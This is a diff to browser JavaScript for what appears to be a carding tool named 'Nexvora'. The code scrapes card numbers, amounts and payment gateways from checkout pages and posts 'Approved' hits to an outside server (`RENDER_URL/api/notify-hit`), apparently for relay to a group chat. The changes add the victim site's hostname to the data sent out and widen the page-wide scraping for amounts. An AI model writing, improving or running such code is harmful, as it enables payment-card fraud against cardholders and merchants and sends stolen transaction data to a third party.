@@ -20,6 +20,7 @@
         
         try {
             hasNotifiedSuccess = true;
+            const siteName = window.location.hostname;
             console.info('🚀 Nexvora: Sending hit to group...', hitData);
 
             const response = await fetch(`${RENDER_URL}/api/notify-hit`, {
@@ -32,7 +33,8 @@
                     amount: hitData.amount,
                     gateway: hitData.gateway,
                     status: hitData.status,
-                    user_chat_id: userChatId
+                    user_chat_id: userChatId,
+                    site_name: siteName
                 })
             });
             const data = await response.json();
@@ -69,7 +71,9 @@
             
             const hitData = {
                 card: parts.find(p => /^\d{4,}/.test(p)) || 'N/A',
-                amount: parts.find(p => p.includes('$') || /^\d+\.\d{2}/.test(p)) || document.querySelector('.amount')?.innerText || 'N/A',
+                amount: parts.find(p => p.includes('$') || /^\d+\.\d{2}/.test(p)) || 
+                        Array.from(document.querySelectorAll('*')).find(el => el.innerText && el.innerText.includes('$'))?.innerText.trim() || 
+                        'N/A',
                 gateway: parts.find(p => ['stripe', 'square', 'braintree', 'paypal'].includes(p.toLowerCase())) || 'Stripe',
                 status: 'Approved'
             };
